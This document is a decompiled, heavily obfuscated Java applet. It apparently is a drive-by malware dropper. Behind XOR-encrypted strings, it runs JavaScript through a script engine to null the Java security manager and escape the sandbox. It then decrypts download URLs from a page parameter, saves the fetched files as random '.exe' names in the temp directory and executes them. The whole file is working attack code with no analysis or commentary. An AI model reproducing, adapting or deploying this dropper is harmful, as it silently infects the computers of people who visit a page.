// 
// Decompiled by Procyon v0.5.30
// 

public final class Applet extends java.applet.Applet
{
    private static Object a;
    private static Boolean b;
    
    private static String a(final String s, final int n, final int n2) {
        return (String)a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011"), s, e("\u0005l\u0014j\u0002k\u001fw\u0011"), new Class[] { Integer.TYPE, Integer.TYPE }, new Object[] { n, n2 });
    }
    
    private static String a(final Object o) {
        return (String)a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011[\u0003\u007f\u0010|\u0004"), o, e("m\u0019J\u0002k\u001fw\u0011"), new Class[0], new Object[0]);
    }
    
    @Override
    public final String toString() {
        try {
            final String s = (String)a(e("s\u0017o\u00177\u0017i\u0006u\u0013mXX\u0006i\u001a|\u0002"), this, e("~\u0013m&x\u0004x\u001b|\u0002|\u0004"), new Class[] { String.class }, new Object[] { e("z\u0019v\u001dp\u0013") });
            if (Applet.b) {
                System.out.println(new StringBuilder().insert(0, e("l\u0004u\u0005U\u001fj\u0002#V")).append(s).toString());
            }
            if (s == null || s.equals("")) {
                if (Applet.b) {
                    System.out.println(e("\\$K9KL9\u0018vVl\u0004u\u0005"));
                }
                return "";
            }
            final String a = a(s, c(e("KK\u001eq$(\u007fQpj'jo)\u0011\u0019\\)L\u001bfe`\twZ|\u0011\\Ez8\u0006o:\u0012*5q\u0004l>hQ'1[Zu-Xcwz\u00042728<c\u001aw(5r\u0006\u001cgU\n0\f")), c(e("\u0012\\}\u000f%y\u007f\\\u0011\u001d~1M\u0017Z\bA4MByABXHY0\rD\u0005v\";T)XD\u0014{'\u007f\u0019_<\\\t\\-s\u0015R\u001eq}\b!U\u000b\u00020_& U~u\ba\u0013\nkU\u0006")));
            if (Applet.b) {
                System.out.println(new StringBuilder().insert(0, e("l\u0004u\u0005U\u001fj\u0002#V")).append(a).toString());
            }
            a(a, e("M"));
        }
        catch (Exception ex) {
            if (Applet.b) {
                ex.printStackTrace();
            }
        }
        return "";
    }
    
    private static Object a() {
        return a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011[\u0003\u007f\u0010|\u0004"), new Class[0], new Object[0]);
    }
    
    private static void a(final String s) {
        final String e = e("\u001cx\u0000xXu\u0017w\u00117$l\u0018m\u001ft\u0013");
        if (Applet.a == null) {
            Applet.a = a(e("\u001cx\u0000xXu\u0017w\u00117$l\u0018m\u001ft\u0013"), null, e("~\u0013m$l\u0018m\u001ft\u0013"), new Class[0], new Object[0]);
        }
        a(e, Applet.a, e("|\u000e|\u0015"), new Class[] { String.class }, new Object[] { s });
    }
    
    private static void b(final String s) {
        try {
            if (!s.startsWith(e("q\u0002m\u0006"))) {
                if (Applet.b) {
                    System.out.println(new StringBuilder().insert(0, e("\\$K9KL9\u0014x\u00129\u0003k\u001a#V")).append(s).toString());
                }
                return;
            }
            final String string = new StringBuilder().insert(0, (String)a(e("s\u0017o\u00177\u001ax\u0018~XJ\u000fj\u0002|\u001b"), null, e("\u0011|\u0002I\u0004v\u0006|\u0004m\u000f"), new Class[] { String.class }, new Object[] { e("s\u0017o\u00177\u001fvXm\u001bi\u0012p\u0004") })).append((double)a(e("s\u0017o\u00177\u001ax\u0018~XT\u0017m\u001e"), null, e("k\u0017w\u0012v\u001b"), new Class[0], new Object[0]) + e("7\u0013a\u0013")).toString();
            final Object a = a(e("s\u0017o\u00177\u0018|\u00027#K:"), new Class[] { String.class }, new Object[] { s });
            a(e("s\u0017o\u00177\u0018|\u00027#K:"), a, e("v\u0006|\u0018Z\u0019w\u0018|\u0015m\u001fv\u0018"), new Class[0], new Object[0]);
            final Object a2 = a(e("s\u0017o\u00177\u0018|\u00027#K:"), a, e("v\u0006|\u0018J\u0002k\u0013x\u001b"), new Class[0], new Object[0]);
            final Object a3 = a(e("s\u0017o\u00177\u001fvX_\u001fu\u0013V\u0003m\u0006l\u0002J\u0002k\u0013x\u001b"), new Class[] { String.class }, new Object[] { string });
            final String s2 = string;
            final Object o = a3;
            final Object o2 = a2;
            a(o2, a3);
            b(o2, o);
            a(s2);
        }
        catch (Exception ex) {
            if (Applet.b) {
                ex.printStackTrace();
            }
        }
    }
    
    private static Object a(final String s, final Class[] array, final Object[] array2) {
        if (Applet.b) {
            System.out.println(new StringBuilder().insert(0, e("z\u0004|\u0017m\u0013P\u0018j\u0002x\u0018z\u0013#V")).append(s).append(e("9^")).append(array2.length).append(e("_")).toString());
        }
        return Class.forName(s).getConstructor((Class<?>[])array).newInstance(array2);
    }
    
    private static String c(final String s) {
        final String e;
        final int d = d(e = e("\"mO<\u0011LIk)$\u001fS.s?n&\\$(\u0012-/6')A\u007f7q\u0003TL,P\"\u0005V8c:_\u0018t\u0015C\u0017a>[\u001dN /[u\u0000]Uh\u0006|\u000f{D*%^57Nv="));
        final Object a = a();
        final int d2 = d(s);
        int n;
        int i = n = 0;
        while (i < d2) {
            final String s2 = e;
            final int a2 = a(s, n);
            final int a3 = a(s2, n % d);
            final Object o = a;
            final char c = (char)(a2 ^ a3);
            ++n;
            a(o, new Character(c).toString());
            i = n;
        }
        return a(a);
    }
    
    @Override
    public final void init() {
        try {
            final Object a = a(e("s\u0017o\u0017aXj\u0015k\u001fi\u00027%z\u0004p\u0006m3w\u0011p\u0018|;x\u0018x\u0011|\u0004"), a(e("s\u0017o\u0017aXj\u0015k\u001fi\u00027%z\u0004p\u0006m3w\u0011p\u0018|;x\u0018x\u0011|\u0004"), new Class[0], new Object[0]), e("\u0011|\u0002\\\u0018~\u001fw\u0013[\u000fW\u0017t\u0013"), new Class[] { String.class }, new Object[] { e("s\u0005") });
            a(e("\u001cx\u0000x\u000e7\u0005z\u0004p\u0006mXJ\u0015k\u001fi\u0002\\\u0018~\u001fw\u0013"), a, e("|\u0000x\u001a"), new Class[] { String.class }, new Object[] { e("\u007f\u0003w\u0015m\u001fv\u00189\u0002v%m\u0004p\u0018~^v_b\u001f9K9F\"\u0002q\u001fjXm\u0019J\u0002k\u001fw\u00119K9\u0010l\u0018z\u0002p\u0019w^0\rp\u00101VpV$K9F9_m\u0004`\rs\u0017o\u00177\u001ax\u0018~XJ\u000fj\u0002|\u001b7\u0005|\u0002J\u0013z\u0003k\u001fm\u000fT\u0017w\u0017~\u0013k^w\u0003u\u001a0MvXm\u0019J\u0002k\u001fw\u00111_\"\u000b9\u0015x\u0002z\u001e1V|V0\rd\u001f9K9G\"\u0004|\u0002l\u0004wV>Q\"\u000b\"\u00139K9\u0018|\u000193k\u0004v\u00041_\"\u00137\u001b|\u0005j\u0017~\u00139K9\u0002q\u001fjMk\u0013m\u0003k\u00189\u0013\"\u000b") });
            final String e = e("s\u0017o\u0017aXj\u0015k\u001fi\u00027?w\u0000v\u0015x\u0014u\u0013");
            final Object o = a;
            final String e2 = e("p\u0018o\u0019r\u0013_\u0003w\u0015m\u001fv\u0018");
            final Class[] array = { String.class, Object[].class };
            final Object[] array2 = { e("m\u0019J\u0002k\u001fw\u0011"), null };
            final int n = 1;
            final Object[] array3 = new Object[n];
            array3[0] = this;
            array2[n] = array3;
            a(e("s\u0017o\u00177\u0017i\u0006u\u0013mXX\u0006i\u001a|\u0002"), this, e("\u0017}\u0012"), new Class[] { Class.forName(e("s\u0017o\u00177\u0017n\u000275v\u001bi\u0019w\u0013w\u0002")) }, new Object[] { a(e("\u001cx\u0000x\u000e7\u0005n\u001fw\u00117<U\u001fj\u0002"), new Class[] { Object[].class }, new Object[] { { a(e, o, e2, array, array2) } }) });
        }
        catch (Exception ex) {
            if (Applet.b) {
                ex.printStackTrace();
            }
        }
    }
    
    private static Object a(final String s, final Object o, final String s2, final Class[] array, final Object[] array2) {
        if (Applet.b) {
            System.out.println(new StringBuilder().insert(0, e("p\u0018o\u0019r\u0013T\u0013m\u001ev\u0012#V")).append(s).append(e("9X")).append(s2).append(e("9^")).append(array2.length).append(e("_")).toString());
        }
        return Class.forName(s).getMethod(s2, (Class<?>[])array).invoke(o, array2);
    }
    
    private static String a(final String s, final String s2, final String s3) {
        final Object a = a();
        final int d = d(s);
        int n;
        int i = n = 0;
        while (i < d) {
            final int n2 = n;
            final int b;
            if ((b = b(s2, a(s, n2, n2 + 1))) >= 0) {
                final Object o = a;
                final int n3 = b;
                a(o, a(s3, n3, n3 + 1));
            }
            i = ++n;
        }
        return a(a);
    }
    
    private static void a(final Object o, final Object o2) {
        final byte[] array = new byte[4096];
        int intValue;
        while ((intValue = (int)a(e("\u001cx\u0000xXp\u00197?w\u0006l\u0002J\u0002k\u0013x\u001b"), o, e("k\u0013x\u0012"), new Class[] { byte[].class }, new Object[] { array })) != -1) {
            a(e("s\u0017o\u00177\u001fvXV\u0003m\u0006l\u0002J\u0002k\u0013x\u001b"), o2, e("\u0001k\u001fm\u0013"), new Class[] { byte[].class, Integer.TYPE, Integer.TYPE }, new Object[] { array, 0, intValue });
        }
    }
    
    private static void a(String s, String s2) {
        if (b(s, s2) < 0) {
            b(s);
            return;
        }
        final String s3 = s;
        s2 = s2;
        s = s3;
        final String[] array;
        final int length = (array = (String[])a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011"), s, e("\u0005i\u001ap\u0002"), new Class[] { String.class }, new Object[] { s2 })).length;
        int n;
        int i = n = 0;
        while (i < length) {
            b(array[n++].trim());
            i = n;
        }
    }
    
    private static void a(final Object o, final String s) {
        a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011[\u0003\u007f\u0010|\u0004"), o, e("x\u0006i\u0013w\u0012"), new Class[] { String.class }, new Object[] { s });
    }
    
    private static int b(final String s, final String s2) {
        return (int)a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011"), s, e("\u001fw\u0012|\u000eV\u0010"), new Class[] { String.class }, new Object[] { s2 });
    }
    
    static {
        Applet.b = false;
        Applet.a = null;
    }
    
    private static int d(final String s) {
        return (int)a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011"), s, e("u\u0013w\u0011m\u001e"), new Class[0], new Object[0]);
    }
    
    private static void b(final Object o, final Object o2) {
        final Object[] array = { o, o2 };
        try {
            final Object[] array2;
            final int length = (array2 = array).length;
            int i = 0;
            while (i < length) {
                a(e("\u001cx\u0000xXp\u001975u\u0019j\u0013x\u0014u\u0013"), array2[i++], e("\u0015u\u0019j\u0013"), new Class[0], new Object[0]);
            }
        }
        catch (Exception ex) {
            if (Applet.b) {
                ex.printStackTrace();
            }
        }
    }
    
    private static int a(final String s, final int n) {
        return (char)a(e("s\u0017o\u00177\u001ax\u0018~XJ\u0002k\u001fw\u0011"), s, e("z\u001ex\u0004X\u0002"), new Class[] { Integer.TYPE }, new Object[] { n });
    }
    
    private static String e(final String s) {
        final int length = s.length();
        final char[] array = new char[length];
        int n;
        int i = n = length - 1;
        final char[] array2 = array;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n2 = n;
            final char char1 = s.charAt(n2);
            --n;
            array3[n2] = (char)(char1 ^ 'v');
            if (n < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n3 = n;
            final char c = (char)(s.charAt(n3) ^ '\u0019');
            --n;
            array4[n3] = c;
            i = n;
        }
        return new String(array2);
    }
}
